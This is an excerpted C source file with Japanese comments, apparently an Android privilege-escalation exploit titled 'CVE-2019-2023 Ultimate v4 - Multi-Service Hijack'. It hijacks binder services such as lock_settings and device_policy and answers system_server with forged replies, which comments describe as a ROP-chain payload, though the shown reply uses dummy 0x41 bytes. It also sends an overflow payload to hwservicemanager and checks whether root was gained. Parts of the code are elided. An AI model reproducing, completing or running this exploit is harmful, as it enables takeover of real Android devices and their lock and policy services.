...
// 乗っ取り対象リスト（system_server が確実に呼ぶサービス）
// `persistent_data_block` はロック画面などで使われる
// `device_policy` はポリシー変更時に呼ばれる
// `lock_settings` はロック設定で呼ばれる
// `mount` はストレージマウント時に呼ばれる
...
static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    ...
    if (!fp) {
        // ファイルが開けない場合は stderr に出力
        fp = stderr;
        fprintf(fp, "[ERROR] Cannot open %s for logging\n", LOG_FILE);
    }
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    ...
    if (data && t->data_size > 0) {
        ...
        dump_hex(fp, data, t->data_size > 256 ? 256 : t->data_size);
    }
...
static int binder_server_loop(int binder_fd, int expected_handle) {
    ...
    while (1) {
        ...
        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            ...
            // 応答を偽装して system_server に特定のデータを返す（ペイロード）
            // ここでは、system_server にシェルコードのアドレスを返すなど（ダミー）
            // 実際には ROP チェーンを返す
            struct {
                uint32_t cmd;
                uint32_t status;
            ...
            reply.status = 0;
            // 応答にダミーデータを埋め込む
            memset(reply.payload, 0x41, sizeof(reply.payload));
...
// ============================================================
// メイン：全サービスを順次乗っ取り、サーバーを起動
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate v4 - Multi-Service Hijack\n");
    ...
    if (fp) {
        ...
        printf("[-] Failed to create log file %s (errno=%d)\n", LOG_FILE, errno);
        // 代替として /data/local/tmp が存在するか確認
        if (mkdir("/data/local/tmp", 0755) == 0) {
            printf("[+] Created /data/local/tmp\n");
            fp = fopen(LOG_FILE, "w");
            if (fp) { fclose(fp); printf("[+] Log file created\n"); }
        }
    }
    ...
    for (int i = 0; hijack_targets[i] != NULL; i++) {
        if (exploit_cve_2019_2023(hijack_targets[i]) == 0) {
            ...
            printf("[+] Entered Binder looper for service %s\n", hijack_targets[i]);

            // サーバープロセスをフォーク
            server_pid = fork();
            if (server_pid == 0) {
                // 子プロセスでサーバーループ実行
                int cnt = binder_server_loop(binder_fd, g_service_handle);
                printf("[SERVER] Handled %d transactions. Exiting.\n", cnt);
                exit(0);
    ...
    // サーバーが動作している間、他の攻撃も試行
    printf("[*] Server running. Waiting for transactions...\n");

    // オーバーフロー攻撃（別サービス名で）
    printf("[*] Triggering overflow on hwservicemanager...\n");
    if (exploit_cve_2019_2023("overflow_payload") == 0) {
        printf("[+] Overflow payload sent.\n");
        // オーバーフロー後、hwservicemanager が再起動するのを待つ
        sleep(3);
    }
    ...
    if (getuid() == 0 || geteuid() == 0) {
        ...
        printf("[-] Still not root. Check log for any leaked information.\n");
        g_exploit_success = 0;
    }
    goto done;
